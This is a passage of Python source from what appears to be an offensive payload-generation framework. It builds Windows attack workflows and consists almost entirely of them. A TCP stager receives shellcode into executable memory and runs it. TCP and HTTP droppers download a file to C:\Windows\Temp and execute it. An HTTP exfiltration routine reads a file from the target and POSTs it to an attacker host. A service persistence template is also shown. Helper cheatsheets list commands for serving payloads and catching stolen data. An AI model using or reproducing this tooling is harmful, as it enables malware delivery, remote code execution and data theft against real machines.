                    arguments=(NameRef("svc_handle"),),
                ),
                Jump("close_scm_ok"),
            )),

            Block("close_scm_ok", (
                CallAPI(
                    "CloseServiceHandle",
                    arguments=(NameRef("scm_handle"),),
                ),
                Jump("success"),
            )),

            Block("close_scm_fail", (
                CallAPI(
                    "CloseServiceHandle",
                    arguments=(NameRef("scm_handle"),),
                ),
                Jump("fail"),
            )),

            success,
            fail,
        ),
        entry="entry",
    )


class IRServicePersistTemplate(WorkflowTemplate):
    """IR-backed service_persist template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_service_persist_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_service_persist_workflow(
            service_name=config.service_name or _DEFAULT_SERVICE_NAME,
            dst_path=config.dst_path or _DEFAULT_DST_PATH,
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        svc = config.service_name or _DEFAULT_SERVICE_NAME
        dst = config.dst_path or _DEFAULT_DST_PATH
        return [
            ("Service name", svc),
            ("Binary path on target", dst),
            ("Check status", f"sc query {svc}"),
            ("Remove service", f"sc delete {svc}"),
        ]


# ---------------------------------------------------------------------------
# TCP stager workflow
# ---------------------------------------------------------------------------

_MEM_COMMIT_RESERVE = 0x3000
_PAGE_EXECUTE_READWRITE = 0x40


def build_tcp_stager_workflow(
    lhost: str = "127.0.0.1",
    lport: int = 4444,
) -> Workflow:
    """Build the tcp_stager reference workflow.

    WSAStartup -> WSASocketA -> connect -> recv(4 byte size header) ->
    VirtualAlloc(RWX) -> recv loop (accumulate into allocated buffer) ->
    closesocket -> call [virt_buf] (transfer to stage 2)

    Protocol: [4 bytes LE] stage2_size, then [stage2_size bytes] raw shellcode.

    No exit strategy: control transfers to stage 2 (CallSlot). The only
    failure path is a hang (Terminate), since there is nothing to clean up
    if network setup fails before stage 2 runs.
    """
    port_be = _socket.htons(lport)
    ip_le = _struct.unpack("<I", _socket.inet_aton(lhost))[0]

    return Workflow(
        name="ir_tcp_stager",
        blocks=(
            Block("entry", (
                DefineConstant("sin_port_be", port_be),
                DefineConstant("sin_addr_le", ip_le),
                DefineConstant("af_inet", 2),

                AllocateStruct("wsadata", "WSADATA"),
                AllocateStruct("sa", "sockaddr_in"),

                AllocateLocal("bytes_total"),
                AllocateLocal("bytes_recvd"),
                AllocateLocal("remaining"),
                AllocateLocal("recv_buf_ptr"),

                CallAPI(
                    "WSAStartup",
                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
                    result="wsa_ret",
                ),
                Compare("wsa_ret", SuccessPredicate.ZERO,
                        true_block="create_socket", false_block="fail"),
            )),

            Block("create_socket", (
                CallAPI(
                    "WSASocketA",
                    arguments=(
                        Immediate(2),    # AF_INET
                        Immediate(1),    # SOCK_STREAM
                        Immediate(6),    # IPPROTO_TCP
                        Immediate(0),    # lpProtocolInfo = NULL
                        Immediate(0),    # g = 0
                        Immediate(0),    # dwFlags = 0
                    ),
                    result="socket_handle",
                ),
                Compare("socket_handle", SuccessPredicate.INVALID_HANDLE,
                        true_block="connect_socket", false_block="fail"),
            )),

            Block("connect_socket", (
                ZeroStruct("sa"),
                WriteStructField("sa", "sin_family", NameRef("af_inet")),
                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
                WriteStructField("sa", "sin_addr", NameRef("sin_addr_le")),

                CallAPI(
                    "connect",
                    arguments=(
                        NameRef("socket_handle"),
                        AddressOf("sa"),
                        Immediate(0x10),
                    ),
                    result="conn_ret",
                ),
                Compare("conn_ret", SuccessPredicate.ZERO,
                        true_block="recv_size", false_block="fail"),
            )),

            Block("recv_size", (
                CallAPI(
                    "recv",
                    arguments=(
                        NameRef("socket_handle"),
                        AddressOf("bytes_total"),
                        Immediate(4),
                        Immediate(0),
                    ),
                    result="recv_size_ret",
                ),
                Compare("recv_size_ret", SuccessPredicate.SIGNED_POSITIVE,
                        true_block="alloc_buffer", false_block="fail"),
            )),

            Block("alloc_buffer", (
                CallAPI(
                    "VirtualAlloc",
                    arguments=(
                        Immediate(0),               # lpAddress = NULL
                        NameRef("bytes_total"),
                        Immediate(_MEM_COMMIT_RESERVE),
                        Immediate(_PAGE_EXECUTE_READWRITE),
                    ),
                    result="virt_buf",
                ),
                Compare("virt_buf", SuccessPredicate.NONZERO,
                        true_block="init_recv", false_block="fail"),
            )),

            Block("init_recv", (
                WriteSlot("bytes_recvd", Immediate(0)),
                Jump("recv_loop"),
            )),

            Block("recv_loop", (
                ArithOp("recv_buf_ptr", NameRef("virt_buf"),
                        NameRef("bytes_recvd"), "add"),
                ArithOp("remaining", NameRef("bytes_total"),
                        NameRef("bytes_recvd"), "sub"),

                CallAPI(
                    "recv",
                    arguments=(
                        NameRef("socket_handle"),
                        NameRef("recv_buf_ptr"),
                        NameRef("remaining"),
                        Immediate(0),
                    ),
                    result="recv_ret",
                ),
                Compare("recv_ret", SuccessPredicate.SIGNED_POSITIVE,
                        true_block="accumulate", false_block="recv_done"),
            )),

            Block("accumulate", (
                ArithOp("bytes_recvd", NameRef("bytes_recvd"),
                        NameRef("recv_ret"), "add"),
                ArithOp("remaining", NameRef("bytes_total"),
                        NameRef("bytes_recvd"), "sub"),
                Compare("remaining", SuccessPredicate.NONZERO,
                        true_block="recv_loop", false_block="recv_done"),
            )),

            Block("recv_done", (
                CallAPI(
                    "closesocket",
                    arguments=(NameRef("socket_handle"),),
                ),
                CallSlot("virt_buf"),
            )),

            Block("fail", (
                Terminate(TerminateStyle.HANG),
            )),
        ),
        entry="entry",
    )


class IRTcpStagerTemplate(WorkflowTemplate):
    """IR-backed tcp_stager template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_tcp_stager_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        return build_tcp_stager_workflow(
            lhost=config.lhost,
            lport=config.lport,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Serve stage-2 shellcode",
             f"python3 Tools/tcp_stage_server.py --port {config.lport} "
             f"--file emitter_out/bin/shellcode.bin"),
            ("Protocol", "[4 bytes LE size][raw stage-2 shellcode bytes]"),
        ]


# ---------------------------------------------------------------------------
# TCP download workflow
# ---------------------------------------------------------------------------

_GENERIC_WRITE = 0x40000000
_CREATE_ALWAYS = 2
_FILE_ATTRIBUTE_NORMAL = 0x80


def build_tcp_download_workflow(
    lhost: str = "127.0.0.1",
    lport: int = 4444,
    dst_path: str = r"C:\Windows\Temp\payload.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the tcp_download reference workflow.

    WSAStartup -> WSASocketA -> connect -> recv(4 byte size header) ->
    VirtualAlloc -> recv loop -> closesocket ->
    CreateFileA -> WriteFile -> CloseHandle -> WinExec(dst) -> exit

    Same recv loop protocol as tcp_stager, but writes to disk and executes
    instead of jumping to the buffer.
    """
    port_be = _socket.htons(lport)
    ip_le = _struct.unpack("<I", _socket.inet_aton(lhost))[0]

    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_tcp_download",
        blocks=(
            Block("entry", (
                DefineConstant("sin_port_be", port_be),
                DefineConstant("sin_addr_le", ip_le),
                DefineConstant("af_inet", 2),

                AllocateStruct("wsadata", "WSADATA"),
                AllocateStruct("sa", "sockaddr_in"),

                AllocateLocal("bytes_total"),
                AllocateLocal("bytes_recvd"),
                AllocateLocal("remaining"),
                AllocateLocal("recv_buf_ptr"),
                AllocateLocal("bytes_written"),

                ConstructString("dst_path", dst_path),

                CallAPI(
                    "WSAStartup",
                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
                    result="wsa_ret",
                ),
                Compare("wsa_ret", SuccessPredicate.ZERO,
                        true_block="create_socket", false_block="fail"),
            )),

            Block("create_socket", (
                CallAPI(
                    "WSASocketA",
                    arguments=(
                        Immediate(2), Immediate(1), Immediate(6),
                        Immediate(0), Immediate(0), Immediate(0),
                    ),
                    result="socket_handle",
                ),
                Compare("socket_handle", SuccessPredicate.INVALID_HANDLE,
                        true_block="connect_socket", false_block="fail"),
            )),

            Block("connect_socket", (
                ZeroStruct("sa"),
                WriteStructField("sa", "sin_family", NameRef("af_inet")),
                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
                WriteStructField("sa", "sin_addr", NameRef("sin_addr_le")),

                CallAPI(
                    "connect",
                    arguments=(
                        NameRef("socket_handle"),
                        AddressOf("sa"),
                        Immediate(0x10),
                    ),
                    result="conn_ret",
                ),
                Compare("conn_ret", SuccessPredicate.ZERO,
                        true_block="recv_size", false_block="fail"),
            )),

            Block("recv_size", (
                CallAPI(
                    "recv",
                    arguments=(
                        NameRef("socket_handle"),
                        AddressOf("bytes_total"),
                        Immediate(4),
                        Immediate(0),
                    ),
                    result="recv_size_ret",
                ),
                Compare("recv_size_ret", SuccessPredicate.SIGNED_POSITIVE,
                        true_block="alloc_buffer", false_block="fail"),
            )),

            Block("alloc_buffer", (
                CallAPI(
                    "VirtualAlloc",
                    arguments=(
                        Immediate(0),
                        NameRef("bytes_total"),
                        Immediate(_MEM_COMMIT_RESERVE),
                        Immediate(_PAGE_EXECUTE_READWRITE),
                    ),
                    result="virt_buf",
                ),
                Compare("virt_buf", SuccessPredicate.NONZERO,
                        true_block="init_recv", false_block="fail"),
            )),

            Block("init_recv", (
                WriteSlot("bytes_recvd", Immediate(0)),
                Jump("recv_loop"),
            )),

            Block("recv_loop", (
                ArithOp("recv_buf_ptr", NameRef("virt_buf"),
                        NameRef("bytes_recvd"), "add"),
                ArithOp("remaining", NameRef("bytes_total"),
                        NameRef("bytes_recvd"), "sub"),
                CallAPI(
                    "recv",
                    arguments=(
                        NameRef("socket_handle"),
                        NameRef("recv_buf_ptr"),
                        NameRef("remaining"),
                        Immediate(0),
                    ),
                    result="recv_ret",
                ),
                Compare("recv_ret", SuccessPredicate.SIGNED_POSITIVE,
                        true_block="accumulate", false_block="recv_done"),
            )),

            Block("accumulate", (
                ArithOp("bytes_recvd", NameRef("bytes_recvd"),
                        NameRef("recv_ret"), "add"),
                ArithOp("remaining", NameRef("bytes_total"),
                        NameRef("bytes_recvd"), "sub"),
                Compare("remaining", SuccessPredicate.NONZERO,
                        true_block="recv_loop", false_block="recv_done"),
            )),

            Block("recv_done", (
                CallAPI(
                    "closesocket",
                    arguments=(NameRef("socket_handle"),),
                ),
                Jump("write_file"),
            )),

            Block("write_file", (
                CallAPI(
                    "CreateFileA",
                    arguments=(
                        AddressOf("dst_path"),
                        Immediate(_GENERIC_WRITE),
                        Immediate(0),               # dwShareMode = 0
                        Immediate(0),               # lpSecurityAttributes = NULL
                        Immediate(_CREATE_ALWAYS),
                        Immediate(_FILE_ATTRIBUTE_NORMAL),
                        Immediate(0),               # hTemplateFile = NULL
                    ),
                    result="file_handle",
                ),
                Compare("file_handle", SuccessPredicate.INVALID_HANDLE,
                        true_block="do_write", false_block="fail"),
            )),

            Block("do_write", (
                CallAPI(
                    "WriteFile",
                    arguments=(
                        NameRef("file_handle"),
                        NameRef("virt_buf"),
                        NameRef("bytes_total"),
                        AddressOf("bytes_written"),
                        Immediate(0),               # lpOverlapped = NULL
                    ),
                    result="write_ret",
                ),
                CallAPI(
                    "CloseHandle",
                    arguments=(NameRef("file_handle"),),
                ),
                Jump("exec_payload"),
            )),

            Block("exec_payload", (
                CallAPI(
                    "WinExec",
                    arguments=(AddressOf("dst_path"), Immediate(0)),
                    result="exec_ret",
                ),
                Compare("exec_ret", SuccessPredicate.NONZERO,
                        true_block="success", false_block="fail"),
            )),

            success,
            fail,
        ),
        entry="entry",
    )


class IRTcpDownloadTemplate(WorkflowTemplate):
    """IR-backed tcp_download template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_tcp_download_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_tcp_download_workflow(
            lhost=config.lhost,
            lport=config.lport,
            dst_path=config.dst_path or r"C:\Windows\Temp\payload.exe",
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        dst = config.dst_path or r"C:\Windows\Temp\payload.exe"
        return [
            ("Serve payload",
             f"python3 Tools/tcp_stage_server.py --port {config.lport} "
             f"--file <payload.exe>"),
            ("Protocol", "[4 bytes LE size][raw file bytes]"),
            ("Written to", dst),
            ("Auto-executed via WinExec after download", ""),
        ]


# ---------------------------------------------------------------------------
# HTTP download workflow
# ---------------------------------------------------------------------------

_PAGE_READWRITE = 0x04
_DEFAULT_USER_AGENT = "Mozilla/5.0"
_DEFAULT_ALLOC = 0x100000


def build_http_download_workflow(
    url: str = "http://192.168.1.100/payload.exe",
    dst_path: str = r"C:\Windows\Temp\payload.exe",
    user_agent: str = _DEFAULT_USER_AGENT,
    alloc_size: int = _DEFAULT_ALLOC,
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the http_download reference workflow.

    InternetOpenA -> InternetOpenUrlA -> VirtualAlloc(PAGE_READWRITE) ->
    InternetReadFile chunked loop (BOOL return + bytes_read==0 EOF check) ->
    InternetCloseHandle x2 ->
    CreateFileA -> WriteFile -> CloseHandle -> WinExec(dst) -> exit

    The read loop passes the full remaining byte count to InternetReadFile;
    the API handles partial reads internally.
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_http_download",
        blocks=(
            Block("entry", (
                ConstructString("user_agent", user_agent),
                ConstructString("url", url),
                ConstructString("dst_path", dst_path),

                AllocateLocal("bytes_total"),
                AllocateLocal("bytes_read"),
                AllocateLocal("buf_ptr"),

                CallAPI(
                    "InternetOpenA",
                    arguments=(
                        AddressOf("user_agent"),
                        Immediate(1),     # INTERNET_OPEN_TYPE_DIRECT
                        Immediate(0),     # lpszProxy = NULL
                        Immediate(0),     # lpszProxyBypass = NULL
                        Immediate(0),     # dwFlags = 0
                    ),
                    result="inet_session",
                ),
                Compare("inet_session", SuccessPredicate.NONZERO,
                        true_block="open_url", false_block="fail"),
            )),

            Block("open_url", (
                CallAPI(
                    "InternetOpenUrlA",
                    arguments=(
                        NameRef("inet_session"),
                        AddressOf("url"),
                        Immediate(0),     # lpszHeaders = NULL
                        Immediate(0),     # dwHeadersLength = 0
                        Immediate(0),     # dwFlags = 0
                        Immediate(0),     # dwContext = 0
                    ),
                    result="inet_url",
                ),
                Compare("inet_url", SuccessPredicate.NONZERO,
                        true_block="alloc_buffer", false_block="fail"),
            )),

            Block("alloc_buffer", (
                CallAPI(
                    "VirtualAlloc",
                    arguments=(
                        Immediate(0),                   # lpAddress = NULL
                        Immediate(alloc_size),
                        Immediate(_MEM_COMMIT_RESERVE),
                        Immediate(_PAGE_READWRITE),
                    ),
                    result="virt_buf",
                ),
                Compare("virt_buf", SuccessPredicate.NONZERO,
                        true_block="init_read", false_block="fail"),
            )),

            Block("init_read", (
                WriteSlot("bytes_total", Immediate(0)),
                Jump("read_loop"),
            )),

            Block("read_loop", (
                ArithOp("buf_ptr", NameRef("virt_buf"),
                        NameRef("bytes_total"), "add"),
                CallAPI(
                    "InternetReadFile",
                    arguments=(
                        NameRef("inet_url"),
                        NameRef("buf_ptr"),
                        Immediate(alloc_size),
                        AddressOf("bytes_read"),
                    ),
                    result="irf_ret",
                ),
                Compare("irf_ret", SuccessPredicate.NONZERO,
                        true_block="check_eof", false_block="read_done"),
            )),

            Block("check_eof", (
                Compare("bytes_read", SuccessPredicate.NONZERO,
                        true_block="accumulate", false_block="read_done"),
            )),

            Block("accumulate", (
                ArithOp("bytes_total", NameRef("bytes_total"),
                        NameRef("bytes_read"), "add"),
                Jump("read_loop"),
            )),

            Block("read_done", (
                CallAPI(
                    "InternetCloseHandle",
                    arguments=(NameRef("inet_url"),),
                ),
                CallAPI(
                    "InternetCloseHandle",
                    arguments=(NameRef("inet_session"),),
                ),
                Jump("write_file"),
            )),

            Block("write_file", (
                CallAPI(
                    "CreateFileA",
                    arguments=(
                        AddressOf("dst_path"),
                        Immediate(_GENERIC_WRITE),
                        Immediate(0),               # dwShareMode = 0
                        Immediate(0),               # lpSecurityAttributes = NULL
                        Immediate(_CREATE_ALWAYS),
                        Immediate(_FILE_ATTRIBUTE_NORMAL),
                        Immediate(0),               # hTemplateFile = NULL
                    ),
                    result="file_handle",
                ),
                Compare("file_handle", SuccessPredicate.INVALID_HANDLE,
                        true_block="do_write", false_block="fail"),
            )),

            Block("do_write", (
                CallAPI(
                    "WriteFile",
                    arguments=(
                        NameRef("file_handle"),
                        NameRef("virt_buf"),
                        NameRef("bytes_total"),
                        AddressOf("bytes_read"),
                        Immediate(0),               # lpOverlapped = NULL
                    ),
                    result="write_ret",
                ),
                CallAPI(
                    "CloseHandle",
                    arguments=(NameRef("file_handle"),),
                ),
                Jump("exec_payload"),
            )),

            Block("exec_payload", (
                CallAPI(
                    "WinExec",
                    arguments=(AddressOf("dst_path"), Immediate(0)),
                    result="exec_ret",
                ),
                Compare("exec_ret", SuccessPredicate.NONZERO,
                        true_block="success", false_block="fail"),
            )),

            success,
            fail,
        ),
        entry="entry",
    )


class IRHttpDownloadTemplate(WorkflowTemplate):
    """IR-backed http_download template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_http_download_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_http_download_workflow(
            url=config.url or "http://192.168.1.100/payload.exe",
            dst_path=config.dst_path or r"C:\Windows\Temp\payload.exe",
            alloc_size=config.alloc_size or _DEFAULT_ALLOC,
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        url_val = config.url or "http://192.168.1.100/payload.exe"
        dst = config.dst_path or r"C:\Windows\Temp\payload.exe"
        return [
            ("Serve file via HTTP",
             f"python3 -m http.server {config.lport} --bind {config.lhost}"),
            ("URL fetched", url_val),
            ("Written to", dst),
            ("Auto-executed via WinExec after download", ""),
        ]


# ---------------------------------------------------------------------------
# HTTP exfiltration workflow
# ---------------------------------------------------------------------------

_GENERIC_READ = 0x80000000
_OPEN_EXISTING = 3
_FILE_SHARE_READ = 1
_INTERNET_SERVICE_HTTP = 3


def build_http_exfil_workflow(
    src_path: str = r"C:\Users\target\secret.txt",
    exfil_host: str = "192.168.1.100",
    exfil_port: int = 8080,
    url_path: str = "/exfil",
    user_agent: str = _DEFAULT_USER_AGENT,
    alloc_size: int = _DEFAULT_ALLOC,
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the http_exfil reference workflow.

    Phase 1 (read file into buffer):
      CreateFileA(GENERIC_READ) -> VirtualAlloc(PAGE_READWRITE) ->
      ReadFile chunked loop -> CloseHandle(file)

    Phase 2 (POST data to attacker):
      InternetOpenA -> InternetConnectA(host, port, HTTP) ->
      HttpOpenRequestA("POST", url_path) ->
      HttpSendRequestA(buf, bytes_total) ->
      InternetCloseHandle x3 -> exit
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_http_exfil",
        blocks=(
            Block("entry", (
                ConstructString("src_path", src_path),
                ConstructString("user_agent", user_agent),
                ConstructString("exfil_host", exfil_host),
                ConstructString("url_path", url_path),
                ConstructString("http_post", "POST"),

                AllocateLocal("bytes_total"),
                AllocateLocal("bytes_read"),
                AllocateLocal("buf_ptr"),

                CallAPI(
                    "CreateFileA",
                    arguments=(
                        AddressOf("src_path"),
                        Immediate(_GENERIC_READ),
                        Immediate(_FILE_SHARE_READ),
                        Immediate(0),               # lpSecurityAttributes = NULL
                        Immediate(_OPEN_EXISTING),
                        Immediate(_FILE_ATTRIBUTE_NORMAL),
                        Immediate(0),               # hTemplateFile = NULL
                    ),
                    result="file_handle",
                ),
                Compare("file_handle", SuccessPredicate.INVALID_HANDLE,
                        true_block="alloc_buffer", false_block="fail"),
            )),

            Block("alloc_buffer", (
                CallAPI(
                    "VirtualAlloc",
                    arguments=(
                        Immediate(0),                   # lpAddress = NULL
                        Immediate(alloc_size),
                        Immediate(_MEM_COMMIT_RESERVE),
                        Immediate(_PAGE_READWRITE),
                    ),
                    result="virt_buf",
                ),
                Compare("virt_buf", SuccessPredicate.NONZERO,
                        true_block="init_read", false_block="fail"),
            )),

            Block("init_read", (
                WriteSlot("bytes_total", Immediate(0)),
                Jump("read_loop"),
            )),

            Block("read_loop", (
                ArithOp("buf_ptr", NameRef("virt_buf"),
                        NameRef("bytes_total"), "add"),
                CallAPI(
                    "ReadFile",
                    arguments=(
                        NameRef("file_handle"),
                        NameRef("buf_ptr"),
                        Immediate(alloc_size),
                        AddressOf("bytes_read"),
                        Immediate(0),               # lpOverlapped = NULL
                    ),
                    result="rf_ret",
                ),
                Compare("rf_ret", SuccessPredicate.NONZERO,
                        true_block="check_eof", false_block="read_done"),
            )),

            Block("check_eof", (
                Compare("bytes_read", SuccessPredicate.NONZERO,
                        true_block="accumulate", false_block="read_done"),
            )),

            Block("accumulate", (
                ArithOp("bytes_total", NameRef("bytes_total"),
                        NameRef("bytes_read"), "add"),
                Jump("read_loop"),
            )),

            Block("read_done", (
                CallAPI(
                    "CloseHandle",
                    arguments=(NameRef("file_handle"),),
                ),
                Jump("inet_open"),
            )),

            Block("inet_open", (
                CallAPI(
                    "InternetOpenA",
                    arguments=(
                        AddressOf("user_agent"),
                        Immediate(1),     # INTERNET_OPEN_TYPE_DIRECT
                        Immediate(0),     # lpszProxy = NULL
                        Immediate(0),     # lpszProxyBypass = NULL
                        Immediate(0),     # dwFlags = 0
                    ),
                    result="inet_session",
                ),
                Compare("inet_session", SuccessPredicate.NONZERO,
                        true_block="inet_connect", false_block="fail"),
            )),

            Block("inet_connect", (
                CallAPI(
                    "InternetConnectA",
                    arguments=(
                        NameRef("inet_session"),
                        AddressOf("exfil_host"),
                        Immediate(exfil_port),
                        Immediate(0),     # lpszUserName = NULL
                        Immediate(0),     # lpszPassword = NULL
                        Immediate(_INTERNET_SERVICE_HTTP),
                        Immediate(0),     # dwFlags = 0
                        Immediate(0),     # dwContext = 0
                    ),
                    result="inet_conn",
                ),
                Compare("inet_conn", SuccessPredicate.NONZERO,
                        true_block="http_open", false_block="fail"),
            )),

            Block("http_open", (
                CallAPI(
                    "HttpOpenRequestA",
                    arguments=(
                        NameRef("inet_conn"),
                        AddressOf("http_post"),
                        AddressOf("url_path"),
                        Immediate(0),     # lpszVersion = NULL
                        Immediate(0),     # lpszReferrer = NULL
                        Immediate(0),     # lplpszAcceptTypes = NULL
                        Immediate(0),     # dwFlags = 0
                        Immediate(0),     # dwContext = 0
                    ),
                    result="inet_request",
                ),
                Compare("inet_request", SuccessPredicate.NONZERO,
                        true_block="http_send", false_block="fail"),
            )),

            Block("http_send", (
                CallAPI(
                    "HttpSendRequestA",
                    arguments=(
                        NameRef("inet_request"),
                        Immediate(0),     # lpszHeaders = NULL
                        Immediate(0),     # dwHeadersLength = 0
                        NameRef("virt_buf"),
                        NameRef("bytes_total"),
                    ),
                    result="send_ret",
                ),
                CallAPI(
                    "InternetCloseHandle",
                    arguments=(NameRef("inet_request"),),
                ),
                CallAPI(
                    "InternetCloseHandle",
                    arguments=(NameRef("inet_conn"),),
                ),
                CallAPI(
                    "InternetCloseHandle",
                    arguments=(NameRef("inet_session"),),
                ),
                Jump("success"),
            )),

            success,
            fail,
        ),
        entry="entry",
    )


class IRHttpExfilTemplate(WorkflowTemplate):
    """IR-backed http_exfil template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_http_exfil_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_http_exfil_workflow(
            src_path=config.src_path or r"C:\Users\target\secret.txt",
            exfil_host=config.lhost,
            exfil_port=config.lport,
            url_path=config.url_path or "/exfil",
            alloc_size=config.alloc_size or _DEFAULT_ALLOC,
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        src = config.src_path or r"C:\Users\target\secret.txt"
        url_p = config.url_path or "/exfil"
        return [
            ("Catch POST",
             f"python3 Tools/http_exfil_server.py --port {config.lport} "
             f"--bind {config.lhost}"),
            ("Source file on target", src),
            ("POST endpoint",
             f"http://{config.lhost}:{config.lport}{url_p}"),
        ]
